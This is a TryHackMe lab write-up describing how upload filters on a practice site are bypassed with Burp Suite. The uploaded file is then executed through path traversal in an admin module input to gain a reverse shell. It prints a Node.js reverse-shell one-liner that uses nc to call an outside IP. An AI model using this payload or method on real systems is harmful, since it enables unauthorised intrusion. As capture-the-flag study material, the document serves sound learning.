## TryHackMe - Upload Vulnerabilities Challenge Writeup
[ROOM](https://tryhackme.com/r/room/uploadvulns)

This writeup describes the steps I took to exploit upload vulnerabilities and gain a reverse shell on the target.


---

### **Steps and Observations**

1. **Setup and Recon**:
   - Added the ip & subdomains of uploadvulns.thm to `/etc/hosts` and visited the site jewel.uploadvulns.thm .
   - Performed a quick source code review and found `background.js`, which loads images from `/content` with a naming pattern of `XXX.jpg`.
   - Tried listing the `/content` directory but received a 404 error.

2. **Discovering Potential Directories**:
   - Found `upload.js` with filters for file extensions and magic numbers.
   - Ran `gobuster` to find hidden directories, yielding:
     - `/content`
     - `/modules`
     - `/assets`
     - `/admin` (with a module activation input, indicating Node.js backend).

3. **Exploring the `/content` Directory**:
   - Used `gobuster` to search for files in `/content` with `.jpg` extension using the challenge included file.txt wordlist:
     - Findings: `ABH.jpg`, `LKQ.jpg`, `SAD.jpg`, and `UAD.jpg`.

4. **Testing File Upload**:
   - Uploaded a simple `cat.jpg` image to test for any backend processing.
   - Observed that the file was renamed to match the `XXX.jpg` pattern.

5. **Attempting to Exploit with Node.js Reverse Shell**:
   - Created a simple Node.js reverse shell script (`shell.js`):
     ```javascript
     require('child_process').exec('nc -e /bin/sh 10.0.0.1 4242');
     ```
   - Encountered two client-side filters in `upload.js` for file type and magic numbers.

---

### **Exploitation Attempts**

1. **First Attempt**:
   - Converted `shell.js` to a `.jpg` file with magic numbers resembling a JPG signature.
   - Uploaded and located the renamed file using `gobuster`.
   - Accessed `/content/XXX.jpg`, but no reverse shell connection was initiated.
   - Suspected there were execution restrictions, possibly triggered via `/admin` but no reverse shell connection was initiated.

2. **Second Attempt**:
   - Created a second copy of `shell.js` with `.jpg` extension without modifying the magic numbers.
   - Used Burp Suite to bypass the client-side filters in `upload.js`.
   - Successfully uploaded the file and located it with `gobuster`.
   - Triggered execution via `/admin` with `input=../content/XXX.jpg`, successfully gaining a reverse shell!

